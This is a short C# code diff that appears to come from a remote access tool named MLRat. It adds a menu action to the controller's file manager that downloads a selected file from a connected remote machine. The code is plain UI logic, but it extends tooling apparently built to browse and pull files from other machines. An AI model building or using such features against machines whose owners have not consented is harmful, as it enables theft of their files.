@@ -1,4 +1,5 @@
-﻿using MLRat.Server;
+﻿using MLManagementServer.Handlers;
+using MLRat.Server;
 using SharedCode.Network;
 using System;
 using System.Collections.Generic;
@@ -156,6 +157,21 @@ namespace MLManagementServer.Forms
             lvFileView.Items.Add("Loading...");
             Console.WriteLine("Current directory: {0}", CurrentDirectory);
             Client.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Update, CurrentDirectory);
+        }
+
+        private void downloadFileToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvFileView.SelectedItems.Count > 0)
+            {
+                ListViewItem i = lvFileView.SelectedItems[0];
+                if (i.ImageKey != "File")
+                    return;
+                string rPath = CurrentDirectory;
+                if (!rPath.EndsWith("\\"))
+                    rPath += "\\";
+                rPath += i.Text;
+                FileExplorerHandler.StartDownload(Client, rPath);
+            }
         }
     }
 }
